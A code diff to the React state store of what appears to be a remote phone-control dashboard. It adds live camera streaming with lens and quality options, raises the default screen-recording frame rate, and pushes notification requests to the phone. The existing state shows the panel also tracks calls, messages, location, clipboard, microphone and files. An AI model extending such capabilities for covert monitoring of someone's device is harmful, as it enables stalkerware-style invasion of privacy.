@@ -44,6 +44,8 @@ export function StoreProvider({ children }) {
   const [latestScreenshot, setLatestScreenshot] = useState(null);
   const [screenRecording, setScreenRecording] = useState(false);
   const [latestScreenFrame, setLatestScreenFrame] = useState(null);
+  const [cameraStreaming, setCameraStreaming] = useState(false);
+  const [latestCameraFrame, setLatestCameraFrame] = useState(null);
   const ws = useRef(null);
   const alertTimers = useRef({});
   // Mirrors files.downloadBuffer for the stray-terminator guard below
@@ -383,6 +385,11 @@ function titleOrApp(appName, title, text) {
           break;
         }
 
+        case 'CAMERA_STREAM_FRAME': {
+          setLatestCameraFrame(p);
+          break;
+        }
+
         default:
           break;
       }
@@ -536,13 +543,23 @@ function titleOrApp(appName, title, text) {
       },
       screenRecording,
       latestScreenFrame: (latestScreenFrame && latestScreenFrame.deviceId === activeDeviceId) ? latestScreenFrame : null,
-      startScreenRecord: (fps = 2) => {
+      startScreenRecord: (fps = 15) => {
         setScreenRecording(true);
         sendCommand('screen-record-start', { deviceId: activeDeviceId, fps });
       },
       stopScreenRecord: () => {
         setScreenRecording(false);
         sendCommand('screen-record-stop', { deviceId: activeDeviceId });
+      },
+      cameraStreaming,
+      latestCameraFrame: (latestCameraFrame && latestCameraFrame.deviceId === activeDeviceId) ? latestCameraFrame : null,
+      startCameraStream: (facing = 'back', quality = 'low', fps = 15) => {
+        setCameraStreaming(true);
+        sendCommand('camera-stream-start', { deviceId: activeDeviceId, facing, quality, fps });
+      },
+      stopCameraStream: () => {
+        setCameraStreaming(false);
+        sendCommand('camera-stream-stop', { deviceId: activeDeviceId });
       },
       toggleClipboardCapture: (enable) => {
         setClipboardCapture((c) => ({ ...c, [activeDeviceId]: enable }));
@@ -557,12 +574,15 @@ function titleOrApp(appName, title, text) {
         setNotifications([]);
         if (activeDeviceId) sendCommand('notification-clear-all', { deviceId: activeDeviceId });
       },
-      // Section refresh: pull the stored notification log again from REST.
+      // Section refresh: push actively held notifications from phone AND fetch stored log
       refreshNotifications: () => {
         if (!activeDeviceId) return;
+        sendCommand('request-notifications', { deviceId: activeDeviceId });
         fetch(`/api/devices/${activeDeviceId}/notifications`)
           .then((r) => r.json())
-          .then((list) => setNotifications(list || []))
+          .then((list) => {
+            if (Array.isArray(list) && list.length > 0) setNotifications(list);
+          })
           .catch(() => {});
       },
       removeDevice: async (deviceId) => {
@@ -586,7 +606,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame]
+    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
